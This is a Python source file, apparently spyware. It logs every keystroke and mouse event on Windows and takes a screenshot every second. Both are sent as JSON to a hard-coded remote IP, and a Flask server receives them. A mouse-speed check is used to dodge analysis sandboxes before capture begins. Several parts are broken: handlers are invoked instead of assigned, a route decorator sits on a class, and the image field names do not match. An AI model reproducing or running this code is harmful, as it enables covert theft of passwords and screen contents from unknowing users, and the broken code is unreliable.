#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import fire
from loguru import logger

# # ------------------------------------------------------------------------------------
import pyHook # pyHook 只支持到 python 3.7
import pyhooked
import pythoncom

class MonitorLogger(object):
    def __init__(self, ip = '202.100.1.224', port = 5000) -> None:
        self.ip = ip
        self.port = port

class KeyMouseLogger(object):
    """
    Key or Mouse Logger
    负责记录键盘和鼠标的移动情况，然后将记录情况发送给指定服务端

    Usage:
        python monitor_logger.py key_mouse_logger
    """
    def __init__(self):
        self.fc = FlaskClient()

    def OnKeyboardEvent(self, ip, event, client):
        key_board_event = {
            'MessageType':'KeyboardEvent',
            'MessageName':event.MessageName,
            'Time':event.Time,
            'Key':event.Key
        }
        client.http_post_json(ip, key_board_event)
        return True

    def OnMouseEvent(self, ip, event, client):
        mouse_event = {
            'MessageType':'MouseEvent',
            'MessageName':event.MessageName,
            'Time':event.Time,
            'Position':event.Position # event.Wheel
        }
        client.http_post_json(ip, mouse_event)
        return True
    
    def key_mouse_logger(self, ip = '202.100.1.224'):
        hm = pyHook.HookManager() # create a hook manager
        hm.KeyDown = self.OnKeyboardEvent(ip, self.fc) # watch for all keyboard events
        hm.HookKeyboard() # set the hook
        hm.MouseAll = self.OnMouseEvent(ip, self.fc) # watch for all mouse events
        hm.HookMouse() # set the hook
        pythoncom.PumpMessages() # wait forever


# # ------------------------------------------------------------------------------------
import time
import base64
import win32ui
import win32gui
import win32con
import win32api

screenshotter_path = 'C:\\WINDOWS\\Temp\\screenshot.bmp'

class ScreenShotter(object):
    """
    ScreenShotter
    负责对Windows 环境桌面截屏，案后将截屏图片发送给指定服务端

    Usage:
        python monitor_logger.py screenshotter_logger
    """
    def __init__(self):
        self.fc = FlaskClient()

    def img_b64(self, img):
        b4code = base64.b64encode(img)
        str_b4code = str(b4code)[2:-1]
        # str_b4code = str(str_b4code)[2:-1]
        return str_b4code

    def screenshotter(self):
        hdesktop = win32gui.GetDesktopWindow()
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32gui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
        screenshot.SaveBitmapFile(mem_dc, screenshotter_path)

        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())

    def screenshotter_logger(self, ip, client):
        self.screenshotter()
        screenshot_image = open(screenshotter_path, 'rb').read()
        dict_key = {}
        dict_key['MessageType'] = 'ImageEvent'
        dict_key['ImageData'] = self.img_b64(screenshot_image)
        client.http_post_json(ip, dict_key)

    def screenshotter_loggers(self, ip = '202.100.1.24'):
        while True:
            time.sleep(1)
            self.screenshotter_logger(ip, self.fc)


event_json = '/server_json'

# # ------------------------------------------------------------------------------------
import json

from http.client import HTTPConnection

headers = {
    "Content-Type": "application/json"
}

class FlaskClient(object):
    """
    Flask Client
    客户端，发送器

    Usage:
        python monitor_logger.py flask_client_json
    """
    def http_post_json(self, ip, dict_data, port = 5000):
        client = HTTPConnection(ip, port = port)
        post_json_data = json.dumps(dict_data).encode('utf-8')
        # client.request('POST', '/cgi-bin/keyset_mouse.py', body = post_json_data, headers = headers)
        client.request('POST', event_json, body = post_json_data, headers = headers)

    def flask_client_json(self, ip = '202.100.1.224'):
        json_data = {
            "from": "akjflw",
            "to": "fjlakdj",
            "amount": 3
        }
        self.http_post_json(ip, json_data)


# # ------------------------------------------------------------------------------------
import base64
import datetime

from flask import request, Flask

node = Flask(__name__)
@node.route(event_json, methods = ['POST'])

class FlaskServer(object):
    """
    Flask Server
    服务端，接收器

    Usage:
        python monitor_logger.py flask_server_json
    """
    def b64_img(self, b64):
        b4code = bytes(b64, 'utf-8')
        img = base64.b64decode(b4code)
        return img
    
    def flask_server_json(self):
        node.run(host = '0.0.0.0', port = 5000) # 默认端口 5000
        if request.method == 'POST':
            json_data = request.get_json()
            if json_data['MessageType'] == 'ImageEvent':
                filename = datetime.now().strftime("%Y-%m-%d %H:%M:%S")+'.bmp'
                recv_image = open(filename, 'wb')
                # logger.info(b64_img(json_data['Imageb64']))
                b4code = bytes(json_data['Imageb64'], 'utf-8')
                img = base64.b64decode(b4code)
                recv_image.write(img)
                recv_image.close()
            else:
                logger.info(json_data)
            logger.info('got data')
            return


# # ------------------------------------------------------------------------------------
import time
from SmoothCriminal import mean_mouse_speed

class SandBox(object):
    """
    SandBox
    沙盒探测，应用到 SmoothCriminal
    
    Usage:
        python monitor_logger.py sandbox
    """
    def sanbox(self):
        ss = ScreenShotter()
        timeout = 10
        if mean_mouse_speed(timeout):
            logger.info("This is a box of sand")
        else:
            logger.info("Environment ok! Let's do it")
            ss.screenshotter_loggers()


if __name__ == '__main__':
    fire.Fire(MonitorLogger)
